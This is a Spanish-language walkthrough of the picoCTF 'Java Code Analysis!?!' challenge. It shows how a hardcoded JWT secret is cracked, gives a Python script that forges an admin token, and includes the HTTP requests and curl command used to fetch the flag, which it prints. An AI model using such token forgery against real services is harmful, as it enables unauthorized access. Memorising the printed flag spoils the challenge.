---
title: Java Code Analysis!?!
date: 2025-07-18 17:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, pententing web, java web tokens, jwt]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---
>Java Code Analysis!?!
Author: Nandan Desai
Description
BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:
Username: "user"
Password: "user"
Source code can be downloaded here. Website can be accessed here!.
{: .prompt-tip }

Siguiendo las indicaciones del reto descargamos el código fuente de la web y lo descomprimimos para su análisis
``` shell
wget https://artifacts.picoctf.net/c/483/bookshelf-pico.zip
pablo☠office java-code-analisis$ unzip bookshelf-pico.zip 
```

Después de mirar las pistas que da el reto y de mirar un poco el código encuentro esto en el fichero **SecretGenerator.java**, muy interesantes, pues la generación de un string aleatorio, no es aleatoria sino que siempre devuelve "1234", esta función es llamada por la función **getServerSecret()**, por lo que deja bastante claro que el autor o no sabía valerse de la clase SecureRandom en Java o dejó intencionalmente una suerte de puerta trasera para asegurarse el acceso a todos los libros del sitios de forma gratuita

``` java 
class SecretGenerator {
    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

    @Autowired
    private UserDataPaths userDataPaths;

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
}

```
El fichero **BookShelfConfig.java** también contiene información relevante. 
Por este orden el usuario 1 es user y el 2 debe ser admin, el email de admin además es "admin"
``` java
/*
    * Initialize admin and a user
    * */
    User freeUser = new User();
    freeUser.setProfilePicName("default-avatar.png")
            .setRole(FreeRole)
            .setLastLogin(LocalDateTime.now())
            .setFullName("User")
            .setEmail("user")
            .setPassword(passwordEncoder.encode("user"));
    userRepository.save(freeUser);

    User admin = new User();
    admin.setProfilePicName("default-avatar.png")
            .setRole(AdminRole)
            .setLastLogin(LocalDateTime.now())
            .setFullName("Admin")
            .setEmail("admin")
            .setPassword(passwordEncoder.encode("<redacted>"));
    userRepository.save(admin);
```

También es interesante el fichero **JwtUserInfo.java** pues contiene información de que valores son extraídos del JWT
``` java
/*
* This class will hold the claim values that are extracted from the JWT
* */

@Getter
@Setter
@NoArgsConstructor
@Accessors(chain = true)
public class JwtUserInfo {
    private Integer userId;
    private String email;
    private String role;
}
```
Si navegamos un rato por la web vamos a encontrar con una serie de libros pero con accesos diferentes "premium" y "admin". Supongo que además del usuario tenemos una serie de roles importantes para el funcionamiento de la página. Si visitas el fichero UserService.java también tenemos una pista bastante relevante el rol de Admin.

``` java 
@PreAuthorize("hasAuthority('Admin') and #userRoleRequest.id != authentication.principal.grantedAuthorities[0].userId")
```

Lanzo un primer request desde Zap para caputar y ver la respuesta:

``` html
POST http://saturn.picoctf.net:63664/base/login HTTP/1.1
host: saturn.picoctf.net:63664
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json
Content-Length: 34
Origin: http://saturn.picoctf.net:50421
Connection: keep-alive
Referer: http://saturn.picoctf.net:50421/
Priority: u=1

{"email":"user","password":"user"}
```

Respuesta 

``` html
{"type":"SUCCESS","payload":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4MDA1NiwiaWF0IjoxNzUyODc1MjU2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.8dXmGdjAJjiIt6x2KhlaoYdwiIoLl72BZiApdYL22ZA"}
```

Algo interesante aparece cuando decodificamos este base64:

``` shell
pablo☠office java-code-analisis$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
{"typ":"JWT","alg":"HS256"}% 
pablo☠office java-code-analisis$ echo "eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4MTk5MSwiaWF0IjoxNzUyODc3MTkxLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9" | base64 -d
{"role":"Free","iss":"bookshelf","exp":1753481991,"iat":1752877191,"userId":1,"email":"user"}% 
```
Por un lado descubrimos que la web trabaja con Java Web Tokens y que podemos hacer fuerza bruta para conocer la clave de la firma del hash, esta password como ya descubrimos es 1234, para comprobarlo podemos usar **Jwtcrack** ver el repo en [hacktools/#password-cracking](../hacktools/#password-cracking) y un diccionario como rockyou.

```shell 
(jwtcrack) pablo☠office jwtcrack$ ./crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4MzM3NiwiaWF0IjoxNzUyODc4NTc2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.KFTGvUzu1HRjg8dSl68YnUvrt6garU4jqY8bFZPWz0k ~/pentest/wordlist/rockyou.txt 
Cracking JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4MzM3NiwiaWF0IjoxNzUyODc4NTc2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.KFTGvUzu1HRjg8dSl68YnUvrt6garU4jqY8bFZPWz0k
1081081it [00:35, 30313.55it/s]
Found secret key: 1234
```

Pero como solo queremos comprobar la clave que hemos encontrado creamos un diccionario de 1 entrada.

```shell
(jwtcrack) pablo☠office jwtcrack$ echo "1234" > dic
(jwtcrack) pablo☠office jwtcrack$ ./crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4MzM3NiwiaWF0IjoxNzUyODc4NTc2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.KFTGvUzu1HRjg8dSl68YnUvrt6garU4jqY8bFZPWz0k dic 
Cracking JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4MzM3NiwiaWF0IjoxNzUyODc4NTc2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.KFTGvUzu1HRjg8dSl68YnUvrt6garU4jqY8bFZPWz0k
0it [00:00, ?it/s]
Found secret key: 1234
```

Ahora para ver los datos que necesitamos para actualizar el rol podemos capturar la request al pulsar en nuestro perfil:

``` shell
GET http://saturn.picoctf.net:56265/base/users/1 HTTP/1.1
Host: saturn.picoctf.net:56265
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1MzQ4NjYyNCwiaWF0IjoxNzUyODgxODI0LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.54F1RQYhjsqoDRXDE0K9pMfQYF6FMS84b_2c5RX9E8I
Connection: keep-alive
Referer: http://saturn.picoctf.net:56265/
Priority: u=0
```

Creo un usuario **test** y capturo el tráfico cuando accedo a las páginas, si altero los parámetros encodeo y firmo con la clave **1234**, podría falsear al admin? y acceder a los libros. Compongo la cadena con el payload:
``` json
{"typ": "JWT", "alg": "HS256"}{"role": "Admin","iss": "bookshelf","exp": 1753559781,"iat": 1752954981,"userId": 2,"email":"admin"}
```
Ahora podemos encodearla a base64 y firmarlo con la key JWT que hemos "crackeado".

Para conformar un token podemos usar esta web [https://jwt.io/](https://jwt.io/)
La teoría dice que podrías esta entrada en la web para firmar [https://jwt.io/introduction](https://jwt.io/introduction), Quizás sea yo que no supe como usar bien la web, que al final solo me sirvio para testear el encoder
simplemente introduciendo la key "1234" obviando las instrucciones sobre HMAC SHA256

El problema que encontré es a la hora de hacer el encoding
```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  1234)
```
La discrepancia en el hash que gerena jwt.io vs mi script. 
``` 
ZOOqQTtubOfURWwp33hdLH-BPCOvXLkTm4s3CRPX3F4
#vs
lHEd6aR6sdKZX00iiGUhpf5-mqCHMHb0ja23nj_a_oM
```

Para el decoder deberías introducir la clave en el apartado **Sign JWT: Secret** 
```
JWT Signature Verification(Optional)
Enter the secret used to sign the JWT below: 
1234
```
El script en Python que codifiqué con la ayuda de una IA

``` python
import hmac
import hashlib
import base64
import json

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Objetos originales
header = {"typ": "JWT", "alg": "HS256"}
payload = {
    "role": "Admin",
    "iss": "bookshelf",
    "exp": 1753559781,
    "iat": 1752954981,
    "userId": 2,
    "email": "admin"
}

# Serialización a JSON compacta (sin espacios innecesarios)
header_json = json.dumps(header, separators=(',', ':'))
payload_json = json.dumps(payload, separators=(',', ':'))

# >>> Aquí imprimes la cadena sin codificar <<<
print("Cadena original sin codificar (JSON plano):")
print(f"{header_json}.{payload_json}\n")

# Codificación base64url
header_b64 = base64url_encode(header_json.encode())
payload_b64 = base64url_encode(payload_json.encode())

# Concatenación
message = f'{header_b64}.{payload_b64}'

# Firma
secret = b'1234'
signature = hmac.new(secret, message.encode(), hashlib.sha256).digest()
signature_b64 = base64url_encode(signature)

# JWT final
jwt = f'{message}.{signature_b64}'
print("JWT final:")

print("Authorization: Bearer " + jwt)
```

Ejecuto el script para obtener la cabecera Authorization ya completa

``` shell
pablo☠office java-code-analisis$ python compose_key.py
Cadena original sin codificar (JSON plano):
{"typ":"JWT","alg":"HS256"}.{"role":"Admin","iss":"bookshelf","exp":1753559781,"iat":1752954981,"userId":2,"email":"admin"}

JWT final:
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NTM1NTk3ODEsImlhdCI6MTc1Mjk1NDk4MSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.lHEd6aR6sdKZX00iiGUhpf5-mqCHMHb0ja23nj_a_oM
```

Cuando cargas la página poniendo atención e inspeccionando los recursos que se cargan, podemos encontrar esta ruta **/base/books/cover/5**,esto da a entender que la ruta de los libros debe estar en **/base/books/[algo]**, además el libro que sí podemos ver "Little Brother" sería el numero 3, el segundo libro el número 4 "The Future of the Internet and How to Stop It", y el libro "Flag" el número 5 

Sabemos que [/pdf/] alberga los pdf entonces si suponemos que cada libro se debería encontrar en una estructura de directorios y archivos similar a esta

``` shell
/
└── base
    ├── cover
    │   ├── 3
    │   ├── 4
    │   └── 5
    └── pdf
        ├── 3
        ├── 4
        └── 5
```

Como ya indicamos el 5 debería ser la flag, así que con Zap, modifico el request de **/base/books/cover/5** y simplemente cambio cover por pdf **base/books/pdf/5** y altero la cabecera Authorization. 

``` html
GET http://saturn.picoctf.net:50392/base/books/pdf/5 HTTP/1.1
host: saturn.picoctf.net:50392
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NTM1NTk3ODEsImlhdCI6MTc1Mjk1NDk4MSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.lHEd6aR6sdKZX00iiGUhpf5-mqCHMHb0ja23nj_a_oM
content-length: 80

Connection: keep-alive
Referer: http://saturn.picoctf.net:50392/
Priority: u=0
```

Respuesta, la flag viene en el contenido en bruto del archivo PDF. 
```
>>
stream
BT
/F1 20 Tf
1 0 0 1 50 752 Tm
12 TL
(Great job! Here's your flag:)'
()'
()'
(picoCTF{w34k_jwt_n0t_g00d_42f5774a})'
ET
endstream
endobj
8 0 obj
119
endobj
3 0 obj
<<
```
También podemos lanzarlo desde la consola con Curl
``` shell
 curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NTM1NTk3ODEsImlhdCI6MTc1Mjk1NDk4MSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.lHEd6aR6sdKZX00iiGUhpf5-mqCHMHb0ja23nj_a_oM" http://saturn.picoctf.net:64234/base/books/pdf/5 
```

flag: **picoCTF{w34k_jwt_n0t_g00d_42f5774a}**